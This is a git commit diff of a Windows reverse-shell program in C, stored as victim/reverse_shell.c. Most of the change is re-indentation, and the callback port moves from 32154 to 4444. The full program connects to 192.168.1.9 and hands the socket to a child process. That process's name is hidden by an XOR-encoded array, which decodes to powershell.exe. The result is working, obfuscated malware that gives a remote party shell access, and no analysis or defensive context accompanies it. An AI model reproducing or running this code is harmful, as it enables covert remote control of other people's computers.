889d80008c4e426e1366172db029e83bc1761da8
Long Trần <longhotdog354@gmail.com>
2026-05-05 02:21:03 +0700

    shellFix

--- victim/reverse_shell.c
+++ victim/reverse_shell.c
@@ -1,58 +1,60 @@
-#include <WinSock2.h>
-#include <stdio.h>
-#include <windows.h>
-#pragma comment(lib, "Ws2_32.lib")
+    #include <WinSock2.h>
+    #include <stdio.h>
+    #include <windows.h>
+    #pragma comment(lib, "Ws2_32.lib")
 
-// gcc reverse_shell.c -o reverse_shell -lws2_32
-int main() {
-    SOCKET shell;
-    struct sockaddr_in shell_addr;
-    WSADATA wsadata;
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    int connection;
-    int port = 32154;
-    char RecvServer[512];
-    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
-        printf("[!] WinSock initialization failed!");
-        return 1;
-    }
-    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
+    // gcc reverse_shell.c -o reverse_shell -lws2_32
+    int main() {
+        SOCKET shell;
+        struct sockaddr_in shell_addr;
+        WSADATA wsadata;
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+        int connection;
 
-    shell_addr.sin_port = htons(port);
-    shell_addr.sin_family = AF_INET;
-    shell_addr.sin_addr.s_addr = inet_addr("192.168.1.9");
-
-    connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
-    if (connection == SOCKET_ERROR) {
-        printf("[!] Connect to target server failed, please try again.\n");
-        exit(0);
-    } else {
-        recv(shell, RecvServer, sizeof(RecvServer), 0);
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        ZeroMemory(&pi, sizeof(pi));
-        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
-        unsigned char obfuscated[] = {
-            0x25, 0x3a, 0x22, 0x30, 0x27, 0x26, 0x3d, 0x30, 
-            0x39, 0x39, 0x7b, 0x30, 0x2d, 0x30, 0x00
-        };
-        
-        char key = 0x55;
-        char decoded[15];
-
-        for (int i = 0; i < 14; i++) {
-            decoded[i] = obfuscated[i] ^ key;
+        int port = 4444;
+        char RecvServer[512];
+        if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
+            printf("[!] WinSock initialization failed!");
+            return 1;
         }
-        decoded[14] = '\0';
-        CreateProcess(NULL, decoded, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        memset(RecvServer, 0, sizeof(RecvServer));
-        closesocket(shell);
-        WSACleanup();
-    }
+        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
 
-    return 0; 
-}
+        shell_addr.sin_port = htons(port);
+        shell_addr.sin_family = AF_INET;
+        
+        shell_addr.sin_addr.s_addr = inet_addr("192.168.1.9");
+
+        connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
+        if (connection == SOCKET_ERROR) {
+            printf("[!] Connect to target server failed, please try again.\n");
+            exit(0);
+        } else {
+            recv(shell, RecvServer, sizeof(RecvServer), 0);
+            ZeroMemory(&si, sizeof(si));
+            si.cb = sizeof(si);
+            ZeroMemory(&pi, sizeof(pi));
+            si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
+            unsigned char obfuscated[] = {
+                0x25, 0x3a, 0x22, 0x30, 0x27, 0x26, 0x3d, 0x30, 
+                0x39, 0x39, 0x7b, 0x30, 0x2d, 0x30, 0x00
+            };
+            
+            char key = 0x55;
+            char decoded[15];
+
+            for (int i = 0; i < 14; i++) {
+                decoded[i] = obfuscated[i] ^ key;
+            }
+            decoded[14] = '\0';
+            CreateProcess(NULL, decoded, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            memset(RecvServer, 0, sizeof(RecvServer));
+            closesocket(shell);
+            WSACleanup();
+        }
+
+        return 0; 
+    }
